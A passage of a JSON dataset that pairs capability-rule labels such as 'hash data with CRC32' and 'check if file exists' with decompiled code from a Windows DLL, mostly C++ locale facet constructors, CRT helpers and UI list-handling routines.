      arg1_01 = arg1_00;\n            fcn.180075cd4(arg1_00, 0, arg3);\n            uVar2 = fcn.18008fa9c(arg1_01);\n            *(arg1_00 + 5) = uVar2;\n        }\n        *arg1 = arg1_00;\n        if (bVar3) {\n            fcn.1800023f0(auStack128);\n        }\n    }\n    return 5;\n}\n",
        "token_count": 456
    },
    "18007a47": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18007a474(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    code *pcVar3;\n    int64_t arg2_00;\n    bool bVar4;\n    uchar auStack112 [104];\n    \n    bVar4 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x18);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar4 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = \n            vtable.std::time_put_unsigned_short_int__class_std::ostreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n            ;\n            ppcVar2[2] = NULL;\n            pcVar3 = fcn.1800bfdf0();\n            ppcVar2[2] = pcVar3;\n            fcn.1800b2bb8(0);\n        }\n        *arg1 = ppcVar2;\n        if (bVar4) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 5;\n}\n",
        "token_count": 398
    },
    "18007a55": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18007a554(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    code *pcVar3;\n    int64_t arg2_00;\n    bool bVar4;\n    uchar auStack112 [104];\n    \n    bVar4 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x18);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar4 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = \n            vtable.std::time_put_wchar_t__class_std::ostreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0;\n            ppcVar2[2] = NULL;\n            pcVar3 = fcn.1800bfdf0();\n            ppcVar2[2] = pcVar3;\n            fcn.1800b2bb8(0);\n        }\n        *arg1 = ppcVar2;\n        if (bVar4) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 5;\n}\n",
        "token_count": 396
    },
    "180089ff": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.180089ff4(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = vtable.std::messages_char_.0;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 6;\n}\n",
        "token_count": 313
    },
    "18008a0b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18008a0b8(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = \n            vtable.std::money_get_char__class_std::istreambuf_iterator_char__struct_std::char_traits_char___.0;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 3;\n}\n",
        "token_count": 334
    },
    "18008a17": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18008a17c(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = \n            vtable.std::money_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 3;\n}\n",
        "token_count": 333
    },
    "18008a24": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18008a240(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **arg1_00;\n    int64_t arg2_00;\n    bool bVar2;\n    uchar auStack128 [104];\n    \n    bVar2 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        arg1_00 = fcn.18008fb2c(0x78);\n        if (arg1_00 == NULL) {\n            arg1_00 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack128, arg2_00);\n            bVar2 = true;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = vtable.std::_Mpunct_char_.0;\n            *(arg1_00 + 0x44) = 1;\n            fcn.18008bd50(arg1_00);\n            *arg1_00 = vtable.std::moneypunct_char__1_.0;\n        }\n        *arg1 = arg1_00;\n        if (bVar2) {\n            fcn.1800023f0(auStack128);\n        }\n    }\n    return 3;\n}\n",
        "token_count": 364
    },
    "18008a32": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18008a320(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **arg1_00;\n    int64_t arg2_00;\n    bool bVar2;\n    uchar auStack128 [104];\n    \n    bVar2 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        arg1_00 = fcn.18008fb2c(0x78);\n        if (arg1_00 == NULL) {\n            arg1_00 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack128, arg2_00);\n            bVar2 = true;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = vtable.std::_Mpunct_char_.0;\n            *(arg1_00 + 0x44) = 0;\n            fcn.18008bd50(arg1_00);\n            *arg1_00 = vtable.std::moneypunct_char__0_.0;\n        }\n        *arg1 = arg1_00;\n        if (bVar2) {\n            fcn.1800023f0(auStack128);\n        }\n    }\n    return 3;\n}\n",
        "token_count": 364
    },
    "18008a40": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18008a400(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    code **arg1_00;\n    ulong arg3;\n    code **arg1_01;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack128 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        arg1_00 = fcn.18008fb2c(0x58);\n        if (arg1_00 == NULL) {\n            arg1_00 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            arg3 = fcn.180002370(auStack128, arg2_00);\n            bVar3 = true;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = vtable.std::time_get_char__class_std::istreambuf_iterator_char__struct_std::char_traits_char___.0\n            ;\n            arg1_00[2] = NULL;\n            arg1_00[3] = NULL;\n            arg1_00[4] = NULL;\n            arg1_01 = arg1_00;\n            fcn.1800894f0(arg1_00, 0, arg3);\n            uVar2 = fcn.18008fa9c(arg1_01);\n            *(arg1_00 + 5) = uVar2;\n        }\n        *arg1 = arg1_00;\n        if (bVar3) {\n            fcn.1800023f0(auStack128);\n        }\n    }\n    return 5;\n}\n",
        "token_count": 451
    },
    "18008a4f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18008a4f0(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    code *pcVar3;\n    int64_t arg2_00;\n    bool bVar4;\n    uchar auStack112 [104];\n    \n    bVar4 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x18);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar4 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = vtable.std::time_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0\n            ;\n            ppcVar2[2] = NULL;\n            pcVar3 = fcn.1800b1bc0();\n            ppcVar2[2] = pcVar3;\n            fcn.1800b2bb8(0);\n        }\n        *arg1 = ppcVar2;\n        if (bVar4) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 5;\n}\n",
        "token_count": 393
    },
    "1800b624": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800b6240(uint64_t arg1, uchar *arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    ulong in_stack_00000028;\n    ulong var_3b8h;\n    ulong var_3c0h;\n    ulong var_3c8h;\n    ulong var_3d0h;\n    ulong var_3e0h;\n    uchar auStack1320 [32];\n    uchar *puStack1288;\n    int64_t iStack1280;\n    int64_t iStack1272;\n    uchar uStack1264;\n    uint uStack1263;\n    ushort uStack1259;\n    uchar uStack1257;\n    int64_t iStack1256;\n    uchar auStack1248 [16];\n    char cStack1232;\n    uint64_t uStack1224;\n    uchar *puStack1216;\n    ulong uStack1208;\n    int64_t iStack1200;\n    ulong uStack1184;\n    ulong uStack1176;\n    uint uStack1168;\n    ushort uStack1160;\n    uint uStack1144;\n    uchar uStack1140;\n    ulong var_80h;\n    ulong var_78h;\n    ulong var_bp_70h;\n    ulong var_bp_68h;\n    ulong var_bp_60h;\n    uchar **ppuStack96;\n    ulong var_50h;\n    uint64_t uStack72;\n    \n    uStack72 = *0x180123080 ^ auStack1320;\n    if ((arg4 == 0) || ((arg3 != 0 && (arg2 == NULL)))) {\n        puVar2 = fcn.1800ba53c(arg1);\n        *puVar2 = 0x16;\n        fcn.1800b3508();\n        goto code_r0x0001800b3a0a;\n    }\n    fcn.1800b1864(&iStack1256, in_stack_00000028);\n    uStack1263 = 0;\n    uStack1259 = 0;\n    uStack1257 = 0;\n    iStack1272 = 0;\n    if (((arg1 & 2) != 0) || (uStack1264 = 0,  arg2 == NULL)) {\n        uStack1264 = 1;\n    }\n    ppuStack96 = &puStack1288;\n    uStack1208 = 0;\n    puStack1216 = auStack1248;\n    uStack1184 = 0;\n    uStack1176 = 0;\n    uStack1168 = 0;\n    uStack1160 = 0;\n    uStack1144 = 0;\n    uStack1140 = 0;\n    var_bp_68h = 0;\n    var_bp_60h = 0;\n    var_50h._0_4_ = 0;\n    puStack1288 = arg2;\n    iStack1280 = arg3;\n    uStack1224 = arg1;\n    iStack1200 = arg4;\n    iVar1 = fcn.1800b44d4(&uStack1224);\n    if (arg2 != NULL) {\n        if ((arg1 & 1) == 0) {\n            if ((arg1 & 2) == 0) {\n                if (arg3 != 0) {\n                    if (iStack1272 != arg3) goto code_r0x0001800b39de;\ncode_r0x0001800b3a44:\n                    arg2[arg3 + -1] = 0;\n                }\n            }\n            else if (arg3 != 0) {\n                if (-1 < iVar1) {\n                    if (iStack1272 == arg3) goto code_r0x0001800b3a44;\n                    goto code_r0x0001800b39de;\n                }\n                *arg2 = 0;\n            }\n        }\n        else if (((arg3 != 0) || (iVar1 == 0)) && (iStack1272 != arg3)) {\ncode_r0x0001800b39de:\n            arg2[iStack1272] = 0;\n        }\n    }\n    fcn.1800c34d4(var_bp_60h);\n    var_bp_60h = 0;\n    if (cStack1232 != '\\0') {\n        *(iStack1256 + 0x3a8) = *(iStack1256 + 0x3a8) & 0xfffffffd;\n    }\ncode_r0x0001800b3a0a:\n    fcn.18008fb00(uStack72 ^ auStack1320);\n    return;\n}\n",
        "token_count": 1040
    },
    "1800b62a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800b62ac(uint64_t arg1, ushort *arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    ulong in_stack_00000028;\n    ulong var_3b8h;\n    ulong var_3c0h;\n    ulong var_3c8h;\n    ulong var_3d0h;\n    ulong var_3e0h;\n    uchar auStack1320 [32];\n    ushort *puStack1288;\n    int64_t iStack1280;\n    int64_t iStack1272;\n    uchar uStack1264;\n    uint uStack1263;\n    ushort uStack1259;\n    uchar uStack1257;\n    int64_t iStack1256;\n    uchar auStack1248 [16];\n    char cStack1232;\n    uint64_t uStack1224;\n    uchar *puStack1216;\n    ulong uStack1208;\n    int64_t iStack1200;\n    ulong uStack1184;\n    ulong uStack1176;\n    uint uStack1168;\n    uchar uStack1160;\n    ushort uStack1158;\n    uint uStack1144;\n    uchar uStack1140;\n    ulong var_80h;\n    ulong var_78h;\n    ulong var_bp_70h;\n    ulong var_bp_68h;\n    ulong var_bp_60h;\n    ushort **ppuStack96;\n    ulong var_50h;\n    uint64_t uStack72;\n    \n    uStack72 = *0x180123080 ^ auStack1320;\n    if ((arg4 == 0) || ((arg3 != 0 && (arg2 == NULL)))) {\n        puVar2 = fcn.1800ba53c(arg1);\n        *puVar2 = 0x16;\n        fcn.1800b3508();\n        goto code_r0x0001800b3bdc;\n    }\n    fcn.1800b1864(&iStack1256, in_stack_00000028);\n    uStack1263 = 0;\n    uStack1259 = 0;\n    uStack1257 = 0;\n    iStack1272 = 0;\n    if (((arg1 & 2) != 0) || (uStack1264 = 0,  arg2 == NULL)) {\n        uStack1264 = 1;\n    }\n    ppuStack96 = &puStack1288;\n    uStack1208 = 0;\n    puStack1216 = auStack1248;\n    uStack1184 = 0;\n    uStack1176 = 0;\n    uStack1168 = 0;\n    uStack1160 = 0;\n    uStack1158 = 0;\n    uStack1144 = 0;\n    uStack1140 = 0;\n    var_bp_68h = 0;\n    var_bp_60h = 0;\n    var_50h._0_4_ = 0;\n    puStack1288 = arg2;\n    iStack1280 = arg3;\n    uStack1224 = arg1;\n    iStack1200 = arg4;\n    iVar1 = fcn.1800b46e0(&uStack1224);\n    if (arg2 != NULL) {\n        if ((arg1 & 1) == 0) {\n            if ((arg1 & 2) == 0) {\n                if (arg3 != 0) {\n                    if (iStack1272 != arg3) goto code_r0x0001800b3baf;\ncode_r0x0001800b3c16:\n                    arg2[arg3 + -1] = 0;\n                }\n            }\n            else if (arg3 != 0) {\n                if (-1 < iVar1) {\n                    if (iStack1272 == arg3) goto code_r0x0001800b3c16;\n                    goto code_r0x0001800b3baf;\n                }\n                *arg2 = 0;\n            }\n        }\n        else if (((arg3 != 0) || (iVar1 == 0)) && (iStack1272 != arg3)) {\ncode_r0x0001800b3baf:\n            arg2[iStack1272] = 0;\n        }\n    }\n    fcn.1800c34d4(var_bp_60h);\n    var_bp_60h = 0;\n    if (cStack1232 != '\\0') {\n        *(iStack1256 + 0x3a8) = *(iStack1256 + 0x3a8) & 0xfffffffd;\n    }\ncode_r0x0001800b3bdc:\n    fcn.18008fb00(uStack72 ^ auStack1320);\n    return;\n}\n",
        "token_count": 1057
    },
    "1800c358": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.1800c3588(int64_t arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    uint32_t auStackX8 [2];\n    uchar auStackX16 [8];\n    uint32_t auStackX24 [2];\n    uint32_t auStackX32 [2];\n    uint32_t *apuStack24 [3];\n    \n    auStackX8[0] = arg1;\n    if (auStackX8[0] == 0xfffffffe) {\n        puVar1 = fcn.1800ba51c(arg1);\n        *puVar1 = 0;\n        puVar1 = fcn.1800ba53c(arg1);\n        *puVar1 = 9;\n    }\n    else {\n        if (((-1 < auStackX8[0]) && (auStackX8[0] < *0x180129c50)) &&\n           (arg1 = (auStackX8[0] & 0x3f) * 9, \n           (*(*((auStackX8[0] >> 6) * 8 + 0x180129850) + 0x38 + (auStackX8[0] & 0x3f) * 0x48) & 1) != 0)) {\n            apuStack24[0] = auStackX8;\n            auStackX24[0] = auStackX8[0];\n            auStackX32[0] = auStackX8[0];\n            uVar2 = fcn.1800c3514(auStackX16, auStackX32, apuStack24, auStackX24);\n            return uVar2;\n        }\n        puVar1 = fcn.1800ba51c(arg1);\n        *puVar1 = 0;\n        puVar1 = fcn.1800ba53c(arg1);\n        *puVar1 = 9;\n        fcn.1800b3508();\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 445
    },
    "1800c8ef": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.1800c8efc(uint64_t arg1, ulong arg2, ulong arg3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint64_t arg1_00;\n    int64_t iVar3;\n    ulong uVar4;\n    \n    uVar2 = arg1;\n    if (uVar2 == 0xfffffffe) {\n        puVar1 = fcn.1800ba51c(arg1);\n        *puVar1 = 0;\n        puVar1 = fcn.1800ba53c(arg1);\n        *puVar1 = 9;\n    }\n    else {\n        if ((-1 < uVar2) && (uVar2 < *0x180129c50)) {\n            iVar3 = uVar2 >> 6;\n            if ((*(*(iVar3 * 8 + 0x180129850) + 0x38 + (uVar2 & 0x3f) * 0x48) & 1) != 0) {\n                arg1_00 = uVar2 & 0xffffffff;\n                fcn.1800ce5d8(arg1_00);\n                uVar4 = 0xffffffffffffffff;\n                if ((*(*(iVar3 * 8 + 0x180129850) + 0x38 + (uVar2 & 0x3f) * 0x48) & 1) == 0) {\n                    puVar1 = fcn.1800ba53c(arg1_00);\n                    *puVar1 = 9;\n                    puVar1 = fcn.1800ba51c(arg1_00);\n                    *puVar1 = 0;\n                }\n                else {\n                    uVar4 = fcn.1800c8e60(arg1 & 0xffffffff, arg2, arg3);\n                }\n                fcn.1800ce6c0(arg1 & 0xffffffff);\n                return uVar4;\n            }\n        }\n        puVar1 = fcn.1800ba51c(arg1);\n        *puVar1 = 0;\n        puVar1 = fcn.1800ba53c(arg1);\n        *puVar1 = 9;\n        fcn.1800b3508();\n    }\n    return 0xffffffffffffffff;\n}\n",
        "token_count": 498
    },
    "180003c4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180003c40(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    if (arg1 != arg2) {\n        do {\n            if (arg1 == 0) {\n                return;\n            }\n            iVar1 = *(arg1 + 8);\n            iVar3 = arg3;\n            if (9 < iVar1) {\n                if (iVar1 < 0xc) {\n                    fcn.180003c40(*(arg1 + 0x20), 0, 0);\n                }\n                else if (iVar1 == 0x10) {\n                    if (arg3 != 0) {\n                        *(arg3 + 0x34) = 0;\n                    }\n                    for (iVar2 = *(arg1 + 0x28); iVar2 != 0; iVar2 = *(iVar2 + 0x28)) {\n                        fcn.180003c40(*(iVar2 + 0x10), *(iVar2 + 0x20), arg3);\n                    }\n                }\n                else if (iVar1 == 0x12) {\n                    iVar3 = arg1;\n                    if (arg3 != 0) {\n                        *(arg3 + 0x34) = 0;\n                        *(arg1 + 0x34) = 0;\n                        iVar3 = arg3;\n                    }\n                }\n                else if (((iVar1 == 0x13) && (arg3 == *(arg1 + 0x20))) && (iVar3 = 0,  *(arg3 + 0x34) == -1)) {\n                    *(arg3 + 0x34) = 1;\n                }\n            }\n            arg1 = *(arg1 + 0x10);\n            arg3 = iVar3;\n        } while (arg1 != arg2);\n    }\n    return;\n}\n",
        "token_count": 419
    },
    "1800277d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.1800277d0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong noname_0;\n    uchar *arg2;\n    uchar auStack296 [32];\n    uchar auStack264 [240];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack296;\n    noname_0 = *(arg1 + 0x70);\n    iVar1 = (**0x1800de7f0)(noname_0, 0x188, 0, 0);\n    if (iVar1 == -1) {\n        fcn.180025140(noname_0, auStack264);\n        arg2 = auStack264;\n        fcn.180025000(auStack264);\n    }\n    else {\n        arg2 = iVar1 * 0xf0 + *(arg1 + 0xd8);\n    }\n    fcn.180027880(arg1, arg2);\n    fcn.180027b60(arg1);\n    fcn.180028050(arg1);\n    fcn.18008fb00(uStack24 ^ auStack296);\n    return;\n}\n",
        "token_count": 251
    },
    "180027b6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180027b60(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    \n    iVar1 = (**0x1800de7f0)(*(arg1 + 0x70), 0x188, 0, 0);\n    if (iVar1 != -1) {\n        iVar3 = *(arg1 + 0xe0) - *(arg1 + 0xd8);\n        iVar3 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(iVar3) >> 0x40, 0) + iVar3;\n        uVar2 = (**0x1800de798)(*(arg1 + 0x18), 0x238f);\n        (**0x1800de770)(uVar2, iVar1 < ((iVar3 >> 7) - (iVar3 >> 0x3f)) + -1);\n        uVar2 = (**0x1800de798)(*(arg1 + 0x18), 0x2390);\n        (**0x1800de770)(uVar2, 0 < iVar1);\n    }\n    return;\n}\n",
        "token_count": 263
    },
    "18002805": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180028050(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    ulong noname_0;\n    int64_t arg2;\n    int64_t iVar3;\n    uchar *puVar4;\n    ulong ***pppuVar5;\n    uchar auStack472 [32];\n    ulong uStack440;\n    ulong ***apppuStack424 [3];\n    uint64_t uStack400;\n    uchar auStack392 [32];\n    uchar auStack360 [32];\n    uchar auStack328 [32];\n    uchar auStack296 [32];\n    uchar auStack264 [240];\n    uint64_t uStack24;\n    \n    uStack440 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack472;\n    noname_0 = *(arg1 + 0x70);\n    iVar2 = (**0x1800de7f0)(noname_0, 0x188, 0, 0);\n    if (iVar2 == -1) {\n        fcn.180025140(noname_0, auStack264);\n        puVar4 = auStack264;\n        fcn.180025000(auStack264);\n    }\n    else {\n        puVar4 = iVar2 * 0xf0 + *(arg1 + 0xd8);\n    }\n    (**0x1800de7f0)(*(arg1 + 0xb8), 0x184, 0, 0);\n    arg2 = *(puVar4 + 0x68);\n    iVar3 = *(puVar4 + 0x70);\n    if (arg2 != iVar3) {\n        do {\n            fcn.18000da90(apppuStack424, arg2);\n            fcn.18000da90(auStack392, arg2 + 0x20);\n            fcn.18000da90(auStack360, arg2 + 0x40);\n            fcn.18000da90(auStack328, arg2 + 0x60);\n            fcn.18000da90(auStack296, arg2 + 0x80);\n            pppuVar5 = apppuStack424;\n            if (7 < uStack400) {\n                pppuVar5 = apppuStack424[0];\n            }\n            (**0x1800de7f0)(*(arg1 + 0xb8), 0x180, 0, pppuVar5);\n            fcn.1800252e0(apppuStack424);\n            arg2 = arg2 + 0xa0;\n        } while (arg2 != iVar3);\n        iVar3 = *(puVar4 + 0x70);\n        arg2 = *(puVar4 + 0x68);\n    }\n    iVar1 = iVar3 - arg2 >> 0x3f;\n    if ((iVar3 - arg2) / 0xa0 + iVar1 != iVar1) {\n        (**0x1800de7f0)(*(arg1 + 0xb8), 0x186, 0, 0);\n    }\n    *(arg1 + 99) = 1;\n    fcn.180028210(arg1);\n    fcn.18008fb00(uStack24 ^ auStack472);\n    return;\n}\n",
        "token_count": 720
    },
    "18002821": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180028210(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    ulong noname_0;\n    uchar *arg2;\n    uchar auStack216 [32];\n    uchar auStack184 [160];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack216;\n    noname_0 = *(arg1 + 0x70);\n    iVar1 = (**0x1800de7f0)(noname_0, 0x188, 0, 0);\n    if (iVar1 != -1) {\n        noname_0 = *(arg1 + 0xb8);\n        iVar2 = (**0x1800de7f0)(noname_0, 0x188, 0, 0);\n        if (iVar2 != -1) {\n            arg2 = iVar2 * 0xa0 + *(iVar1 * 0xf0 + 0x68 + *(arg1 + 0xd8));\n            goto code_r0x0001800282a7;\n        }\n    }\n    fcn.1800276c0(noname_0, auStack184);\n    arg2 = auStack184;\n    fcn.1800252e0(auStack184);\ncode_r0x0001800282a7:\n    fcn.1800282f0(arg1, arg2);\n    fcn.1800285a0(arg1);\n    fcn.180028b80(arg1);\n    fcn.18008fb00(uStack24 ^ auStack216);\n    return;\n}\n",
        "token_count": 354
    },
    "1800285a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.1800285a0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    \n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x70), 0x188, 0, 0);\n    if ((iVar3 != -1) && (iVar4 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0),  iVar4 != -1)) {\n        iVar1 = *(iVar3 * 0xf0 + 0x70 + *(arg1 + 0xd8));\n        iVar2 = *(iVar3 * 0xf0 + 0x68 + *(arg1 + 0xd8));\n        uVar5 = (**0x1800de798)(*(arg1 + 0x18), 0x23b6);\n        (**0x1800de770)(uVar5, iVar4 < (iVar1 - iVar2) / 0xa0 + -1);\n        uVar5 = (**0x1800de798)(*(arg1 + 0x18), 0x23b7);\n        (**0x1800de770)(uVar5, 0 < iVar4);\n    }\n    return;\n}\n",
        "token_count": 307
    },
    "18002aa9": {
        "rules": [
